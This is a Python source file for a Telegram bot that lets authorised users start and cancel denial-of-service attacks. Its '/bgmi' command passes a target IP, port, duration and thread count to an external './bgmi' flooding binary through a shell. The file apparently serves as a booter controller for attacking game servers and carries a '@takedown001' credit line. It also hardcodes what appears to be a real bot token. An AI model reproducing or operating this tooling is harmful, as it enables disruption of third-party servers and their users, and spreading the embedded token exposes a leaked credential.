import telebot
import subprocess
import shlex  # For safely passing shell arguments
import datetime
import signal

# Insert your Telegram bot token here
bot = telebot.TeleBot('7982475022:AAEQEGAasDWFQ6371BMqVyPpVNqaGoIn9BM')

# List to store allowed user IDs
allowed_user_ids = ["916136692"]  # Replace with actual user IDs

# Global variable to track the running attack process
attack_process = None

# Function to start the attack and send a reply to the user
def start_attack_reply(message, target, port, time=500, threads=500):
    global attack_process

    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (f"{username}, Attack Started.\n\n"
                f"Taget: {target}\n𝐏𝐨𝐫𝐭: {port}\n"
                f"Time: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n"
                "\nBy @takedown001")
    bot.reply_to(message, response)

    # Sanitize the inputs before executing shell commands
    try:
        port = int(port)
        time = int(time)
        threads = int(threads)

        # Safely build the shell command using shlex.quote
        full_command = f"./bgmi {shlex.quote(target)} {port} {time} {threads}"

        # Start the attack process
        attack_process = subprocess.Popen(full_command, shell=True)

        bot.reply_to(message, "Attack is running.")
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

# Function to cancel the currently running attack
def cancel_attack(message):
    global attack_process
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    if attack_process is not None:
        try:
            attack_process.terminate()  # Try to terminate the process
            attack_process.wait()  # Wait for process to terminate
            bot.reply_to(message, f"{username}, the attack has been canceled successfully.")
            attack_process = None  # Reset the process variable
        except Exception as e:
            bot.reply_to(message, f"Error in canceling the attack: {str(e)}")
    else:
        bot.reply_to(message, "No attack is currently running.")

# Handler for the /bgmi command to start the attack
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        command = message.text.split()

        if len(command) >= 3:  # Ensure user provides at least target and port
            target = command[1]  # The target IP
            port = command[2]  # The port to attack

            # Default time is 500 seconds unless specified by the user
            time = command[3] if len(command) > 3 else 500

            # Default number of threads is 500 unless specified by the user
            threads = command[4] if len(command) > 4 else 500

            # Call the start_attack_reply function to start the attack and reply to the user
            start_attack_reply(message, target, port, time, threads)
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> [time] [threads]\nExample: /bgmi 192.168.1.1 80 60 500")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Handler for the /cancel command to stop the attack
@bot.message_handler(commands=['cancel'])
def handle_cancel(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        cancel_attack(message)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Start polling for messages
bot.polling()
